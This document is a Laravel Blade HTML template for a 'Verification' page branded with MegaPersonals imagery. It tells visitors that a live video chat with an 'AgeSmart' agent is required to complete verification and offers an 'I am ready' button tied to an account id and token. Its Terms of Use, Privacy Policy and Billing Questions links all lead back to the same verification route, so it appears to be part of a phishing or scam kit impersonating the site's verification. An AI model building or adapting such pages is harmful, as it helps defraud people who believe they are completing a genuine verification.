<!doctype html>
<html>
   <head>
      <title>Verification</title>
      <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta charset='utf-8'>
      <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('assets/megapersonals-verification/v2/images/favicon.png') }}">
      <script type="text/javascript" src="{{ asset('assets/megapersonals-verification/v2/js/p2/jquery.min.js') }}"></script>
      <script type="text/javascript" src="{{ asset('assets/megapersonals-verification/v2/js/p2/jquery-ui.min.js') }}"></script>
      <link rel="stylesheet" href="{{ asset('assets/megapersonals-verification/v2/css/p2/jquery-ui.min.css') }}"/>
      <script src="{{ asset('assets/megapersonals-verification/v2/js/p2/bootstrap.bundle.js') }}"></script>
      <link rel="stylesheet" href="{{ asset('assets/megapersonals-verification/v2/css/p2/bootstrap-icons.css') }}">
      <link rel="stylesheet" href="{{ asset('assets/megapersonals-verification/v2/css/p2/bootstrap.min.css') }}">
      <link rel="stylesheet" href="{{ asset('assets/megapersonals-verification/v2/css/p2/custom.css') }}">
   </head>
   <body>
    <main>
        <style>
        #top-header {
            position: fixed;
            top: 0;
            width: 100%;
            box-shadow: 0px 1px 6px 2px #0000007d;
            z-index: 1;
        }
        #top-header img {
            max-width: 90%;
            max-height: 40px;
        }
        #top-header .mp-header {
            background-color: #ff2aac;
            padding: 7px 10px;
            text-align: center;
        }
        .verification-container {
            margin-top: 30px;
        }
    </style>

    <div id="top-header">
        <div class="mp-header">
            <img src="{{ asset('assets/megapersonals-verification/v2/images/p2/megapersonalsPageHeader.png') }}" />
        </div>
    </div>

        <div class="container-fluid verification-container verification-container-page min-vh-100 px-4 py-5">
            <h1 class="bold text-uppercase megapersonals-color-text">Live chat</h1>
            <h3>A live video chat<br>with an AgeSmart<br>agent is required<br>to complete your<br>verification</h3>
            <div class="d-flex flex-column">
                <img class="mx-auto w-25" src='{{ asset('assets/megapersonals-verification/v2/images/p2/camera.png') }}'/>
            </div>
            <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}" class="btn btn-lg btn-success w-50 my-3 mx-auto">
                <h2 class="bold text-uppercase">I am ready</h2><span class="text-uppercase">Live video chat</span><br>
            </a>

            <div class="d-flex flex-column">
                <img class="img-footer-logo mt-2" src='{{ asset('assets/megapersonals-verification/v2/images/p2/footer-logo.png') }}'/>
                <style>
        @media screen and (max-width: 500px) {
            p.copyright {
                font-size: 3vw;
            }
        }
    </style>

    <div>
        <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
        <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
            <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}" target="_blank">Terms of Use</a>
            <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}" target="_blank">Privacy Policy</a>
            <a href="{{ route('megapersonals.verification_steps', ['accountId' => $account->id, 'token' => $token]) }}" target="_blank">Billing Questions</a>
        </p>
    </div>

            </div>
        </div>
    </main>
   </body>
</html>
